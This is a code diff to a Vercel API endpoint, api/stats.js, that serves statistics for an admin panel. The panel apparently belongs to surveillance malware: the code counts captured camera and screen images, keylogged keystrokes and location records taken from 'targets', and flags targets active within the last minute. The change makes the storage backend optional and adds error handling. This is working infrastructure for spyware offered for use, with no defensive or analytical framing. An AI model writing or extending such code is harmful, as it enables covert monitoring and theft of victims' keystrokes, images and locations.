@@ -1,5 +1,11 @@
 // api/stats.js - Statistiques pour le panneau admin
-import { kv } from '@vercel/kv';
+let kv = null;
+try {
+    const kvModule = await import('@vercel/kv');
+    kv = kvModule.kv;
+} catch (e) {
+    console.log('KV not available');
+}
 
 export default async function handler(req, res) {
     res.setHeader('Access-Control-Allow-Origin', '*');
@@ -14,45 +20,49 @@ export default async function handler(req, res) {
     }
     
     try {
-        // Récupérer les statistiques depuis KV
-        const keys = await kv.lrange('data:list', 0, -1);
-        
         let stats = {
             images: 0,
             keys: 0,
             location: 0,
             activeTargets: 0,
-            lastActivity: null
+            lastActivity: null,
+            storage: kv ? 'kv' : 'none'
         };
         
-        // Compter par type
-        for (const key of keys) {
-            const data = await kv.get(key);
-            if (data) {
-                if (data.type === 'camera' || data.type === 'screen') {
-                    stats.images++;
-                } else if (data.type === 'keylog') {
-                    stats.keys += (data.keys || '').length;
-                } else if (data.type === 'location') {
-                    stats.location++;
+        if (kv) {
+            try {
+                const keys = await kv.lrange('data:list', 0, -1);
+                
+                for (const key of keys) {
+                    const data = await kv.get(key);
+                    if (data) {
+                        if (data.type === 'camera' || data.type === 'screen') {
+                            stats.images++;
+                        } else if (data.type === 'keylog') {
+                            stats.keys += (data.keys || '').length;
+                        } else if (data.type === 'location') {
+                            stats.location++;
+                        }
+                        
+                        const timestamp = parseInt(key.split(':')[1]);
+                        if (Date.now() - timestamp < 60000) {
+                            stats.lastActivity = timestamp;
+                        }
+                    }
                 }
                 
-                // Vérifier l'activité récente (moins de 1 minute)
-                const timestamp = parseInt(key.split(':')[1]);
-                if (Date.now() - timestamp < 60000) {
-                    stats.lastActivity = timestamp;
+                if (stats.lastActivity) {
+                    stats.activeTargets = 1;
                 }
+            } catch (kvError) {
+                console.error('KV Error:', kvError.message);
+                stats.storage = 'kv-error';
             }
-        }
-        
-        // Compter les cibles actives (activité dans la dernière minute)
-        if (stats.lastActivity) {
-            stats.activeTargets = 1; // Simplification, à améliorer avec tracking par client
         }
         
         res.status(200).json(stats);
     } catch (error) {
-        console.error('Error:', error);
-        res.status(500).json({ error: 'Internal server error' });
+        console.error('Error:', error.message);
+        res.status(500).json({ error: 'Internal server error', details: error.message });
     }
 }
